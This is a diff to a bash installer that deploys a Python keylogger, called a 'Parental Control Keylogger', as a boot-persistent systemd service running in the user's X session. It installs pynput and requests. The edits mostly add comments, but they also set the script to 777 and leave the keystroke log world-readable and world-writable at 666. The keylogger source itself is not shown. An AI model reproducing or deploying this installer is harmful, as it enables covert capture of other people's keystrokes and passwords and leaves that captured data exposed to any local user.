@@ -20,6 +20,7 @@ if [[ $EUID -ne 0 ]]; then
    exit 1
 fi
 
+# Update package list and install required packages
 echo "[*] Installing dependencies..." | tee -a "$LOG_FILE"
 sudo apt update >> "$LOG_FILE" 2>&1
 sudo apt install -y python3 python3-pip x11-xserver-utils >> "$LOG_FILE" 2>&1
@@ -30,6 +31,7 @@ if ! command -v pip3 &> /dev/null; then
     sudo apt install -y python3-pip >> "$LOG_FILE" 2>&1
 fi
 
+# Install required Python modules
 echo "[*] Installing Python modules..." | tee -a "$LOG_FILE"
 pip3 install --break-system-packages pynput requests >> "$LOG_FILE" 2>&1
 
@@ -38,18 +40,19 @@ INSTALL_DIR="/opt/keylogger"
 echo "[*] Copying keylogger to $INSTALL_DIR/" | tee -a "$LOG_FILE"
 sudo mkdir -p "$INSTALL_DIR"
 sudo cp keylogger.py "$INSTALL_DIR/keylogger.py"
-sudo chmod +x "$INSTALL_DIR/keylogger.py"
+sudo chmod 777 "$INSTALL_DIR/keylogger.py"  # Set full permissions for the script
 
 # Ensure log directory exists
 LOG_DIR="/var/log/keylogger"
+echo "[*] Creating log directory at $LOG_DIR..." | tee -a "$LOG_FILE"
 sudo mkdir -p "$LOG_DIR"
 sudo touch "$LOG_DIR/keylog.txt"
-sudo chmod 666 "$LOG_DIR/keylog.txt"
+sudo chmod 666 "$LOG_DIR/keylog.txt"  # Set full permissions for the log file
 
 # Auto-detect DISPLAY value
-DISPLAY_VALUE=$(sudo -u $USER_NAME bash -c 'echo $DISPLAY')
+DISPLAY_VALUE=$(sudo -u "$USER_NAME" bash -c 'echo $DISPLAY')
 if [[ -z "$DISPLAY_VALUE" ]]; then
-    DISPLAY_VALUE=":0"
+    DISPLAY_VALUE=":0"  # Default display value
 fi
 
 # Create systemd service for persistence
@@ -57,8 +60,8 @@ echo "[*] Creating systemd service..." | tee -a "$LOG_FILE"
 cat <<EOF | sudo tee /etc/systemd/system/keylogger.service > /dev/null
 [Unit]
 Description=Parental Control Keylogger
-After=network.target default.target
-Wants=network-online.target
+After=multi-user.target
+Wants=multi-user.target
 
 [Service]
 ExecStartPre=/bin/sleep 5
@@ -68,6 +71,8 @@ User=$USER_NAME
 Environment="DISPLAY=$DISPLAY_VALUE"
 Environment="XDG_SESSION_TYPE=x11"
 Environment="XAUTHORITY=$USER_HOME/.Xauthority"
+StandardOutput=file:/var/log/keylogger/keylogger_output.log
+StandardError=file:/var/log/keylogger/keylogger_error.log
 
 [Install]
 WantedBy=multi-user.target
